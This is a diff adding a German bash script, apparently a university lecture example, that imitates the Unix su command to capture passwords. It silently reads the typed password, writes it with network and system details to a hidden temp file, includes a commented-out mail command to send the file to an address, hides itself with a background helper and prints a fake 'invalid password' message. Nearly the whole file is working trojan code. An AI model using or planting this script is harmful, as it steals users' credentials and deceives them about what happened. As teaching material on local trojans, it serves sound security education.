@@ -1,0 +1,42 @@
+#!/bin/bash
+# Boshafter Nachbau des su - Befehls
+# setzt aktuelles Verzeichnis (".") im Suchpfad voraus
+TEMPFILE="/tmp/.geheim"
+HIDDEN="/tmp/.hidden.bash"
+SLEEP=10
+SLEEPFILE="/tmp/.sleepfile.bash"
+
+echo -n "Passwort: "   # -n kein Zeilenvorschub
+read -s PASSWORD       # -s silent kein Echo auf Bildschirm
+echo                   # Zeilenvorschub
+sleep 3                # 3s warten
+#echo "su: ungültiges Kennwort"
+#############################################
+# Informationen zusammenstellen
+echo "Das ist ein Vorlesungsbeispiel - bitte keine Antworten!"  >> $TEMPFILE
+echo "Ingolf Brunner"				>> $TEMPFILE
+echo						>> $TEMPFILE
+echo "Aufgerufener Befehl: "$0" "$1" "$2	>> $TEMPFILE
+echo "Passwort:            "$PASSWORD		>> $TEMPFILE
+/sbin/ifconfig					>> $TEMPFILE
+/bin/uname -a                                   >> $TEMPFILE
+echo "."					>> $TEMPFILE
+# Per Mail versenden
+ #/usr/bin/mail -s "Passwortklau" -r "ingolf.brunner@ba-leipzig.de" \
+ #              "it2011@it2011.ba-leipzig.de" \
+ #              < $TEMPFILE
+# Aufräumen
+rm $TEMPFILE
+# To Do
+# Script verbergen/löschen
+echo "#!/bin/bash"                         > $SLEEPFILE
+echo "/bin/mv "$0" "$HIDDEN               >> $SLEEPFILE
+echo "sleep "$SLEEP                       >> $SLEEPFILE
+echo "/bin/mv "$HIDDEN" "$0               >> $SLEEPFILE
+echo "/bin/rm "$SLEEPFILE                 >> $SLEEPFILE
+echo "exit 0"                             >> $SLEEPFILE
+/bin/chmod 777 $SLEEPFILE
+$SLEEPFILE &
+# Script beenden
+echo "su: ungültiges Kennwort"
+exit 1   # su beendet sich bei falschem Passwort mit Exitstatus 1
